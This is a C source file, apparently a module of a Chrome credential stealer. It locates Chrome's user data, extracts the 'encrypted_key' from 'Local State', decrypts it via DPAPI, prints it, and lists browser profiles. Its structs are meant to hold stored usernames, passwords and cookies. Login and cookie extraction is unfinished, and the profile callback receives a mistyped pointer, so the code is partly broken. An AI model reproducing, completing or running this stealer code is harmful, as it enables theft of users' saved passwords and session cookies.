#include "LF_Crypter.c"
#include "LF_Utils.c"

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define LF_CHROME_MAX_PROFILES 10

#define LF_CHROME__USERDATA_PATH "\\Google\\Chrome\\User Data"
#define LF_CHROME__LOCALSTATE_A_PATH "\\Local State"

struct LF_Chrome_login_data_struct
{
  unsigned char *action_url;
  unsigned char *username_value;
  unsigned char *password_value;
};
struct LF_Chrome_cookie_data_struct
{
  unsigned char *host_key;
  unsigned char *name;
  unsigned char *value;
};
struct LF_Chrome_data_struct
{
  struct LF_Utils_arraylist_struct *profile_path_list;
  struct LF_Utils_arraylist_struct *login_data_list;
  struct LF_Utils_arraylist_struct *cookie_data_list;
};

void
LF_Chrome__get_userdata_path (char *out)
{
  char *appdata_path = getenv ("LOCALAPPDATA");

  strcpy (out, appdata_path);
  strcat (out, LF_CHROME__USERDATA_PATH);
}
void
LF_Chrome__get_localstate_path (char *userdata_path, char *out)
{
  strcpy (out, userdata_path);
  strcat (out, LF_CHROME__LOCALSTATE_A_PATH);
}
char *
LF_Chrome__get_encryption_key (char *localstate_path, int *len)
{
  int buf_len = 4096;
  char buf[buf_len];
  LF_Utils_read_file (localstate_path, buf, buf_len);

  const char *key_start = "\"encrypted_key\":\"";
  const char *key_end = "\"";

  char *encryption_key
      = LF_Utils_find_str_in_range (buf, key_start, key_end, len);
  if (encryption_key == NULL)
    {
      fprintf (stderr, "unable to find encryption key\n");
      exit (-1);
    }

  return encryption_key;
}
void
LF_Chrome__profile_search_callback (char *dir_path, WIN32_FIND_DATA ffd,
                                    void *data)
{
  if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
    {
      return;
    }

  if (strncmp (ffd.cFileName, "Profile", 7) != 0
      && strncmp (ffd.cFileName, "Default", 7) != 0)
    {
      return;
    }

  char folder_path[MAX_PATH];
  strcpy (folder_path, dir_path);
  strcat (folder_path, "\\");
  strcat (folder_path, ffd.cFileName);

  LF_Utils_arraylist_add ((struct LF_Utils_arraylist_struct *)data,
                          strdup (folder_path));
}
void
LF_Chrome__populate_profile_arraylist (char *userdata_path,
                                       struct LF_Utils_arraylist_struct *out)
{
  LF_Utils__loop_through_dir (
      userdata_path, LF_Chrome__profile_search_callback, (void **)&out);
}

void
LF_Chrome_populate_data (struct LF_Chrome_data_struct *out)
{
  char userdata_path[MAX_PATH];
  LF_Chrome__get_userdata_path (userdata_path);

  char localstate_path[MAX_PATH];
  LF_Chrome__get_localstate_path (userdata_path, localstate_path);

  int encryption_key_len;
  char *encryption_key
      = LF_Chrome__get_encryption_key (localstate_path, &encryption_key_len);
  printf ("encryption key [%d]: %s\n", encryption_key_len, encryption_key);

  int decrypted_key_len;
  char *decrypted_key = LF_Crypter_decrypt_dpapi (
      encryption_key, encryption_key_len, &decrypted_key_len);
  printf ("decrypted key [%d]: %s\n", decrypted_key_len, decrypted_key);

  out->profile_path_list = LF_Utils_arraylist_new_default ();
  out->login_data_list = LF_Utils_arraylist_new_default ();
  out->cookie_data_list = LF_Utils_arraylist_new_default ();

  LF_Chrome__populate_profile_arraylist (userdata_path,
                                         out->profile_path_list);

  for (int i = 0; i < out->profile_path_list->length; i++)
    {
      char *profile_path = LF_Utils_arraylist_get (out->profile_path_list, i);
      if (profile_path == NULL)
        {
          continue;
        }
    }
  free (encryption_key);
  free (decrypted_key);
}
void
LF_Chrome_free_data (struct LF_Chrome_data_struct *out)
{
  LF_Utils_arraylist_free (out->profile_path_list);
  LF_Utils_arraylist_free (out->login_data_list);
  LF_Utils_arraylist_free (out->cookie_data_list);
}
